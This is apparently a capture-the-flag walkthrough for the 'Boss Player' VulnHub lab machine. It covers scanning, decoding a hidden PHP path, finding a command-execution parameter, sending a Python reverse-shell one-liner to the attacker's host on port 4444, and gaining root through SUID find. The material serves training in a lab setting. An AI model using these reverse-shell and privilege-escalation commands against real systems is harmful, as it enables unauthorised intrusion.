# Boss Player CTF

### 1.Get VM IP

```bash
root@kali: arp-scan -I eth0 -l
Interface: eth0, type: EN10MB, MAC: 08:00:27:b2:e9:3f, IPv4: 192.168.56.102
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1	0a:00:27:00:00:12	(Unknown: locally administered)
192.168.56.100	08:00:27:16:f6:de	PCS Systemtechnik GmbH
192.168.56.123	08:00:27:de:8c:54	PCS Systemtechnik GmbH
```

let's scan the ip address `192.168.56.123`

### 2.Enumeration

```bash
root@kali:nmap -sT -sV -v -p- -oN nmap.out 192.168.56.123
Host is up (0.00060s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
MAC Address: 08:00:27:DE:8C:54 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

check web page :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/53d19546-781b-4327-ba96-1a53c7cd6d75)

check source page:

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/2d30e9b0-1ca1-4b34-bfe0-d91c54c69ae9)

let's decode it :

```bash
root@kali: echo -n 'WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK' | base64 -d | base64 -d | base64 -d
workinginprogress.php
```

navigate to this new address : `http://192.168.56.123/workinginprogress.php`

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/216ba80e-f0db-4fe0-aee0-e121c1be5610)

in this page we need to fuzz for different paramteters to find the correct one, i use burp suit for this and afew common paramters:

and finally found the correct paramter `cmd` and `id` command that is executed on the system
```text
http://192.168.56.123/workinginprogress.php?cmd=id
```

### 3.Gaining Shell

Use a python reverse shell, url encode it and send to get the shell

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

### 4.Privilege Escalation

Search for SUID binaries

```bash
$ find / -user root -perm /4000 2>/dev/null
/usr/bin/mount
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/chsh
/usr/bin/grep
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/find
/usr/bin/newgrp
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
```

here it shows that `find` has SUID bit set, use `GTFobins` to find how to escalate it :


```bash
$ find . -exec /bin/sh -p \; -quit

id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)

cd /root

cat root.txt
Y29uZ3JhdHVsYXRpb25zCg==
```

This is how you can get root on this machine :)














